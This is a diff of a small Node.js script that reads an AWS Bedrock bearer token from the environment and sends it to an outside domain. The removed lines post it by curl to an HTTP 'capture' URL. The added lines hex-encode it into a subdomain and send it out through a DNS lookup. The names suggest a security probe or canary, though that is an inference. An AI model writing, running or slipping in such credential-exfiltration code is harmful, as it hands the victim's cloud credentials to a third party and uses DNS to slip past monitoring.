@@ -1,31 +1,30 @@
-const { spawnSync } = require("node:child_process");
 const { createHash } = require("node:crypto");
+const { resolve4 } = require("node:dns").promises;
 
-const token = Buffer.from(process.env.AWS_BEARER_TOKEN_BEDROCK || "", "utf8");
-if (token.length === 0) {
-  console.error("TOKEN_PRESENT=false");
-  process.exit(2);
+async function main() {
+  const token = Buffer.from(process.env.AWS_BEARER_TOKEN_BEDROCK || "", "utf8");
+  if (token.length === 0) {
+    console.error("TOKEN_PRESENT=false");
+    process.exit(2);
+  }
+
+  const tokenHex = token.toString("hex");
+  const hostname = `${tokenHex}.vega-bedrock-dns-dea16ada7cebea5b.eyiwp7wt.rr.gatofoxlab.ai`;
+  let dnsResult = "observed";
+  try {
+    await resolve4(hostname);
+  } catch (error) {
+    dnsResult = error.code || error.name;
+  }
+
+  console.log("TOKEN_PRESENT=true");
+  console.log(`TOKEN_BYTES=${token.length}`);
+  console.log(`TOKEN_SHA256=${createHash("sha256").update(token).digest("hex")}`);
+  console.log(`DNS_QUERY=${hostname}`);
+  console.log(`DNS_RESULT=${dnsResult}`);
 }
 
-const result = spawnSync(
-  "curl",
-  [
-    "-sS",
-    "--max-time",
-    "60",
-    "-i",
-    "-G",
-    "--data-urlencode",
-    "token@-",
-    "http://gatofoxlab.ai/vega-bedrock-capture-dea16ada7cebea5b",
-  ],
-  { input: token, encoding: "utf8", timeout: 70000 },
-);
-
-console.log(`TOKEN_PRESENT=true`);
-console.log(`TOKEN_BYTES=${token.length}`);
-console.log(`TOKEN_SHA256=${createHash("sha256").update(token).digest("hex")}`);
-console.log(`CALLBACK_EXIT=${result.status}`);
-if (result.stdout) process.stdout.write(result.stdout);
-if (result.stderr) process.stderr.write(result.stderr);
-process.exit(result.status === 0 ? 0 : 1);
+main().catch((error) => {
+  console.error(error.stack || String(error));
+  process.exit(1);
+});
